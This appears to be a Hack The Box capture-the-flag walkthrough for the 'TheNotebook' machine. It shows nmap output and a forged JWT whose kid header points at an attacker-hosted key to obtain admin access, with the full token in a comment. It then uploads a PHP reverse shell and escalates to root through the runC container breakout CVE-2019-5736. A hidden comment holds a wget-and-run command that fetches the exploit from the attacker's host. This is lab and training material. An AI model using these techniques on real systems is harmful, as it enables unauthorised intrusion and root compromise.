![](theNotebook_banner.png)

<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></a>
</p>

# Enumeration

**IP-ADDR:** 10.10.10.230 theNotebook.htb

**nmap scan:**
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp open  http    nginx/1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**web server**

![](screenshots/web-fpage.png)

Registering with new account and notice cookie.

![](screenshots/big-cookie.png)KID manipulationJSON Web Token) authentication cookie

![](screenshots/jwt-auth.png)

# Foothold

## JWT bypass

* **Useful tool:** 
  * [jwt_tool](https://github.com/ticarpi/jwt_tool)
  * [jwt-hack](https://github.com/hahwul/jwt-hack)

* **Resources**
  * [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md)
* Online JWT Encoder – Decoder [jsonwebtoken.io](https://www.jsonwebtoken.io/)
* Online jwt generator [jwtbuilder.jamiekurtz.com](https://jwt.io/)

JWT authentication cookie is divided into three parts: header, payload, signatur. These values divided by `.`

**JSON Web Token:** `Base64(Header).Base64(Data).Base64(Signature)`

* **Header:** contain information about the JWT configuration.
* **Data:** used to store some users’ data.
* **Signature:** used to prevent data from being modified. The signature uses RS256 (RSA asymmetric encryption and private key signature) and HS256 (HMAC SHA256 symmetric encryption) algorithm.

There are multiple ways to bypass [Vickie Li](https://twitter.com/vickieli7) show in his [medium blog](https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a)

On this box we are doing **"KID manipulation"** via **"SSRF"**

**KID:** it allows to specify the key to be used for verifying the token.

**Creating tampered jwt**

**Header**
```json
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "http://10.10.15.71/privKey.key"
}
```

**Data**
```json
{
  "username": "test12",
  "email": "test12@test.com",
  "admin_cap": true
}
```

![](screenshots/jwt-created.png)

After creating jwt save its private key in a file and start web server.
<!--
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNS43MS9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6InRlc3QxMiIsImVtYWlsIjoidGVzdDEyQHRlc3QuY29tIiwiYWRtaW5fY2FwIjp0cnVlfQ.h2XetEdg5NzVsL7p1QvOBxsppWmjMQBzTYP_Nctdv6GPLuJnkXgSv5gcVicyzgWD_dxmbjVG5D7ilitMxLZ0KfmRROfcZ52hKkJEaYPAi6dEfSPup59bN-5Z4A3DdTycyvJRYgG8c7s_GD5gZ9ZkNDyPurD3AnxiwQWUfJvpXE8g169a4isuFsyoGv82RHq4ZQJuWgHZsS-5ZhzenrwVIjrC_6s26bCJmJwwC1CjJkGCARlAnZQIatrkhLoXYrhTy4ELlGkZOUxyCRCsueX1CtAcA2bPDbo2gyiPDJHacgu45rPH74UUxDelQZuCDL1jrFjUZdNuaZs9T4uI3H8etA
-->

now changing the `auth` value in cookie parameter and replace with new generated jwt and forward the request. If everythings gose right we get admin panel

![](screenshots/get-admin.png)

then using hackbar to load tampered cookie

![](screenshots/hackbar-load.png)

admin panel have file upload option which allowed any file to upload **reverse shell** too.

![](screenshots/file-upload.png)

upload php reverse shell get file name execute the file and get shell on the box.

![](screenshots/web-shell.png)

# Privesc

found home directory backup in the `/var/backups` folder which contains noah user home folder.

![](screenshots/back-rsa.png)

## Breaking Docker via runC

User have sudo right to run `docker exec` as any user on the box with NOPASSWD.
```bash
noah@thenotebook:~$ sudo -l
Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```

**Docker version 18.06.0-ce, build 0ffa825**

searchsploit found exploit
```bash
❯ searchsploit Docker 18.06
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
runc < 1.0-rc6 (Docker < 18.09.2) - Container Breakout (1)                          | linux/local/46359.md
runc < 1.0-rc6 (Docker < 18.09.2) - Container Breakout (2)                          | linux/local/46369.md
------------------------------------------------------------------------------------ ---------------------------------
```

Also found the runc bianry
```bash
noah@thenotebook:~$ ls -la /usr/sbin/runc
-rwxr-xr-x 1 root root 7841912 Feb 18 13:45 /usr/sbin/runc
```

**runc version 1.0.0~rc6+dfsg1**

* **[CVE-2019-5736](https://www.cvedetails.com/cve/CVE-2019-5736/):** runc through 1.0-rc6, as used in Docker before 18.09.2 and other products, allows attackers to overwrite the host runc binary (and consequently obtain host root access) by leveraging the ability to execute a command as root within one of these types of containers: (1) a new container with an attacker-controlled image, or (2) an existing container, to which the attacker previously had write access, that can be attached with docker exec. This occurs because of file-descriptor mishandling, related to /proc/self/exe.

* [PoC by Frichetten@github](https://github.com/Frichetten/CVE-2019-5736-PoC)
* [Exploit](https://www.exploit-db.com/exploits/46369)

First get the inside container using sudo command
```bash
sudo -u root /usr/bin/docker exec -it webapp-dev01 /bin/bash
```

Upload [exploit zip](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46369.zip) inside the container

inside zip, modified `bad_init.sh` with command that you want to execute on the host in `BAD_BINARY` variable.

![](screenshots/edit-bad-init.png)

run make script
<!--mkdir /tmp/exp && cd /tmp/exp && wget 10.10.15.71:8000/CVE-2019-5736.zip && unzip CVE-2019-5736.zip && ./make.sh-->

![](screenshots/run-make.png)

Now exit the container and execute `/bin/bash` in the same container 2 times.
```bash
sudo -u root /usr/bin/docker exec -it webapp-dev01 /bin/bash
```

![](screenshots/run-again.png)